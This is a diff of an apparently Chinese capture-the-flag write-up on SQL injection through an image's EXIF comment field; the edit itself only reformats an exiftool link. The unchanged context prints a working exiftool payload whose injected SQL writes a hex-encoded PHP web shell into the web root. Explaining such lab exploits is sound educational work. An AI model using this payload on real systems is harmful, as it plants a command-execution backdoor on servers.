@@ -562,7 +562,8 @@
 <p>再看到文件列表显示的界面：</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png" alt=""></p>
 <p>除了文件名之外后面还有一串类似文件格式一样的东西，详见上面大佬的博客吧，这里给出解题步骤：</p>
-<p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具<a href="https://exiftool.org/，可以编辑图片的的`EXIF`信息" target="_blank" rel="noopener">https://exiftool.org/，可以编辑图片的的`EXIF`信息</a></p>
+<p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt;  <a href="https://exiftool.org/" target="_blank" rel="noopener">https://exiftool.org/</a></p>
+<p>可以编辑图片的的<code>EXIF</code>信息</p>
 <p>payload：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./exiftool -overwrite_original -comment="y1ng\"');select 0x3C3F3D60245F504F53545B305D603B into outfile '/var/www/html/1.php';#" 1.jpg</span><br></pre></td></tr></table></figure>
 
